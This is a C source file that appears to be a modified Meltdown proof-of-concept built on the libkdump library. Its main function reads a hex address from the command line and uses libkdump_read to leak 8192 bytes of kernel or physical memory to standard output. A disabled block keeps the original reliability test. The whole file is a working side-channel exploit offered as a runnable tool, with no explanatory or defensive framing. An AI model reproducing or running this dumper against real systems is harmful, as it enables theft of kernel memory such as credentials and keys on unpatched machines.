#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(int argc, char *argv[]) {
  size_t scratch[4096];
  libkdump_config_t config;
  int progress = 0;
  unsigned char secret = 'X';

  libkdump_enable_debug(0);

  config = libkdump_get_autoconfig();
  config.retries = 10000;
  config.measurements = 8;

	printf("tsx forced off\n");
 printf("attempting to read from address %s\n", argv[1]);

 uint64_t addr = strtoull(argv[1], NULL, 16);
  libkdump_init(config);

  int i;
	for (i = 0; i < 8192; i++) {
		int byte = libkdump_read(addr + i);
	(byte) ?  printf("%x", byte) : printf("xx");
		fflush(stdout);
	//	 printf("got byte %x for 0x%lx %s", byte, addr + i, byte ? "\n" : "- failed?\n");
	}
	printf("\n");
#if 0
  size_t var = (size_t)(scratch + 2048);
  *(char*)var = secret;

  size_t start = libkdump_virt_to_phys(var);
  if (!start) {
    printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    exit(1);
  }
  
  srand(time(NULL));

  size_t correct = 0, wrong = 0, failcounter = 0;
  size_t phys = libkdump_phys_to_virt(start);
  while (1) {
    *(volatile unsigned char*)var = secret;

    int res = libkdump_read(phys);
    if (res == secret) {
      correct++;
    } else if(res != 0) {
      wrong++;
    } else {
      failcounter++;
      if(failcounter < 1000) {
        continue;
      } else {
        failcounter = 0;
        wrong++;
      }
    }
    printf("\r\x1b[34;1m[%c]\x1b[0m Success rate: %.2f%% (read %zd values)    ", "/-\\|"[(progress++ / 100) % 4], (100.f * (double)correct) / (double)(correct + wrong), correct + wrong);
    fflush(stdout);
    secret = (rand() % 255) + 1;
  }
#endif

  libkdump_cleanup();

  return 0;
}
